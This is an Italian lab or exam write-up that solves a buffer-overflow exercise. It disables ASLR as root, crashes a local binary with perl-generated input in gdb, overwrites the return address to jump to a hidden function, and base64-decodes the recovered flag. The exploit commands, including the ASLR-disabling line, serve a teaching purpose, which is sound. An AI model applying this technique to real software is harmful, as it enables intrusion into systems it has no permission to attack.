#25giugno2021 binary exploit

--//obbiettivo:
Compito dello studente è sfruttare la vulnerabilità dell'eseguibile e recuperare la Flag.
La tipologia del buffer overflow è una di quelle viste a lezione.
dobbiamo trovare una scringa di senso compiuto dentro SEC{}

--//preliminari:
1) da root disabilitare randomize:

	echo 0 > /proc/sys/kernel/randomize_va_space

2) se necessario dare permessi di esecuzione

	chmod +x ./esame

--//risoluzione:
1) apriamo l'eseguibile con gdb ed esguiamo un primo run

	gdb esame
	(gdb) set disassembly-flavor intel
	(gdb) run AAAA

2) scopriamo che il programma accetta un argomento
   a tentativi facciamo buffer overflow
   
	(gdb) run $(perl -e "print 'A'x30")
	//segmentation fault
	//cerco di capire come controllare il ritorno
	(gdb) run $(perl -e "print 'A'x16,'BBBB'")

3) disassemblo il main [(gdb) disas main] e lo analizzo
   è presente una strcpy, probabilmente devo saltare a una funzione nascosta
   
   	(gdb) info function
   	//scopro delle funzioni segrete

4) trovo la flag ma non basta devo decodificare il messaggio
	
	(gdb) run $(perl -e 'print "A"x16,"\x3d\x96\x04\x08"')
	//SEC{c2ltcGxlIGJ1ZmZlciBvdmVyZmxvdyB3aXRoIHNlY3JldCBmdW5jdGlvbechig}
	
	|//proviamo con base64 a trovare la stringa di senso compiuto
	|echo 'stringa' | base64 -d
        |
        |alla stringa aggiungiamo = in fondo fino a quando non da invalid input
   	|= è padding usato da base 64 
   	|(la stringa potrebbe comparire cmq)
   	
   	echo c2ltcGxlIGJ1ZmZlciBvdmVyZmxvdyB3aXRoIHNlY3JldCBmdW5jdGlvbg== | base64 -d
        simple buffer overflow with secret function  
        
----fine----------
		
	   	
	   
	   
	
